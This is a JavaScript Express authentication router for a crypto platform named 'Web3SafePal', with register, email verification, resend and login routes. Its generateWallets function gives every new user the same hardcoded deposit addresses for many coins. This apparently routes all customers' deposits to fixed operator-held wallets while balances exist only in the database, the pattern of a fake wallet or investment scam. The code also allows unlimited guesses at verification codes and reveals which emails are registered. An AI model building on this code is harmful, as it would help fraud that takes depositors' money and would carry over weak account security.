const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { PrismaClient } = require('@prisma/client');
const { generateCode, sendVerificationEmail } = require('../services/email');

const router = express.Router();
const prisma = new PrismaClient();

// Generate default wallet addresses for new users
const generateWallets = async (userId) => {
    const wallets = [
        // Bitcoin
        { coin: 'BTC', network: 'mainnet', address: 'bc1q50y5t7jpqhjyyxdgs9gjdjcz2tt9namgkhurer' },
        // Tether TRC20
        { coin: 'USDT', network: 'TRC20', address: 'TWuw4mUSDigSvsBPthMbjRSTdpeGZUS6t1' },
        // Tether ERC20
        { coin: 'USDT', network: 'ERC20', address: '0x38C671bbF2A2fcd1Cc1507A205012D7761680610' },
        // Ethereum
        { coin: 'ETH', network: 'ERC20', address: '0x38C671bbF2A2fcd1Cc1507A205012D7761680610' },
        // Tron
        { coin: 'TRX', network: 'mainnet', address: 'TWuw4mUSDigSvsBPthMbjRSTdpeGZUS6t1' },
        // BNB
        { coin: 'BNB', network: 'mainnet', address: '0x38C671bbF2A2fcd1Cc1507A205012D7761680610' },
        // Polkadot
        { coin: 'DOT', network: 'mainnet', address: '12ALMUuQkxumXuGmAaWGChbuHr5XBfWhRjvVPpA3HtA6NPqx' },
        // Solana
        { coin: 'SOL', network: 'mainnet', address: 'BLwkHrBn1dr3nc1DMoohUnPnVJA2hgL6tGwx1hiUgirD' },
        // Bitcoin Cash
        { coin: 'BCH', network: 'mainnet', address: 'qqcp2lkvh6hpzwdf2xgxwzfmvgecmgn2yyf2t0hu63' },
        // Litecoin
        { coin: 'LTC', network: 'mainnet', address: 'ltc1q8hhx5cplnxwnpzd538v3c26jytveqn4hyzq2pf' },
        // XRP
        { coin: 'XRP', network: 'mainnet', address: 'r3YeMNpwxd7vU9MKB1aAwpiuD2Y3AitAFv' },
        // Cardano
        { coin: 'ADA', network: 'mainnet', address: 'addr1qxrsuxfttdyva6ya0cr0fcmy3hxzfggk207hls3ln7t3rylq2xwk3tyspdzh65uzeyfs8m5pdkvjzp47v5upq7p7qy2swtvjcv' },
        // Dogecoin
        { coin: 'DOGE', network: 'mainnet', address: 'DNRxwmPJnEh8EF1nVXunMiFUz9nHYNCAeH' },
    ];

    // Batch create all wallets at once (much faster!)
    await prisma.wallet.createMany({
        data: wallets.map(wallet => ({
            userId,
            ...wallet,
            balance: 0
        }))
    });
};


// POST /api/auth/register - Register new user
router.post('/register', async (req, res) => {
    try {
        const { email, password, name, referralCode } = req.body;

        // Validate input
        if (!email || !password || !name) {
            return res.status(400).json({ error: 'Email, password, and name are required' });
        }

        // Check if user already exists
        const existingUser = await prisma.user.findUnique({ where: { email } });
        if (existingUser) {
            return res.status(400).json({ error: 'Email already registered' });
        }

        // Hash password
        const hashedPassword = await bcrypt.hash(password, 10);

        // Generate verification code
        const verifyCode = generateCode();
        const verifyExpires = new Date(Date.now() + 15 * 60 * 1000); // 15 minutes

        // Create user (unverified)
        const user = await prisma.user.create({
            data: {
                email,
                password: hashedPassword,
                name,
                referredBy: referralCode || null,
                isVerified: false,
                verifyCode,
                verifyExpires
            }
        });

        // Send verification email
        await sendVerificationEmail(email, name, verifyCode);

        res.status(201).json({
            message: 'Registration successful. Please check your email for verification code.',
            userId: user.id,
            email: user.email,
            requiresVerification: true
        });
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ error: 'Registration failed' });
    }
});

// POST /api/auth/verify - Verify email with code
router.post('/verify', async (req, res) => {
    try {
        const { email, code } = req.body;

        if (!email || !code) {
            return res.status(400).json({ error: 'Email and code are required' });
        }

        // Find user
        const user = await prisma.user.findUnique({ where: { email } });
        if (!user) {
            return res.status(400).json({ error: 'User not found' });
        }

        if (user.isVerified) {
            return res.status(400).json({ error: 'Email already verified' });
        }

        // Check code
        if (user.verifyCode !== code) {
            return res.status(400).json({ error: 'Invalid verification code' });
        }

        // Check expiration
        if (new Date() > user.verifyExpires) {
            return res.status(400).json({ error: 'Verification code expired. Please request a new one.' });
        }

        // Mark as verified
        await prisma.user.update({
            where: { id: user.id },
            data: {
                isVerified: true,
                verifyCode: null,
                verifyExpires: null
            }
        });

        // Create default settings
        await prisma.userSettings.create({
            data: { userId: user.id }
        });

        // Generate wallets
        await generateWallets(user.id);

        // Create welcome notification
        await prisma.notification.create({
            data: {
                userId: user.id,
                title: 'Welcome to Web3SafePal! 🎉',
                message: 'Your account has been verified. Start exploring your dashboard!'
            }
        });

        // Generate token
        const token = jwt.sign(
            { userId: user.id },
            process.env.JWT_SECRET,
            { expiresIn: '7d' }
        );

        res.json({
            message: 'Email verified successfully',
            token,
            user: {
                id: user.id,
                email: user.email,
                name: user.name,
                referralCode: user.referralCode
            }
        });
    } catch (error) {
        console.error('Verification error:', error);
        res.status(500).json({ error: 'Verification failed' });
    }
});

// POST /api/auth/resend - Resend verification code
router.post('/resend', async (req, res) => {
    try {
        const { email } = req.body;

        const user = await prisma.user.findUnique({ where: { email } });
        if (!user) {
            return res.status(400).json({ error: 'User not found' });
        }

        if (user.isVerified) {
            return res.status(400).json({ error: 'Email already verified' });
        }

        // Generate new code
        const verifyCode = generateCode();
        const verifyExpires = new Date(Date.now() + 15 * 60 * 1000);

        await prisma.user.update({
            where: { id: user.id },
            data: { verifyCode, verifyExpires }
        });

        // Send email
        await sendVerificationEmail(email, user.name, verifyCode);

        res.json({ message: 'Verification code sent' });
    } catch (error) {
        console.error('Resend error:', error);
        res.status(500).json({ error: 'Failed to resend code' });
    }
});

// POST /api/auth/login - Login user
router.post('/login', async (req, res) => {
    try {
        const { email, password } = req.body;

        // Validate input
        if (!email || !password) {
            return res.status(400).json({ error: 'Email and password are required' });
        }

        // Find user
        const user = await prisma.user.findUnique({ where: { email } });
        if (!user) {
            return res.status(401).json({ error: 'Invalid email or password' });
        }

        // Check password
        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) {
            return res.status(401).json({ error: 'Invalid email or password' });
        }

        // Check if verified
        if (!user.isVerified) {
            return res.status(401).json({
                error: 'Please verify your email first',
                requiresVerification: true,
                email: user.email
            });
        }

        // Generate token
        const token = jwt.sign(
            { userId: user.id },
            process.env.JWT_SECRET,
            { expiresIn: '7d' }
        );

        res.json({
            message: 'Login successful',
            token,
            user: {
                id: user.id,
                email: user.email,
                name: user.name,
                isAdmin: user.isAdmin,
                referralCode: user.referralCode
            }
        });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Login failed' });
    }
});

module.exports = router;
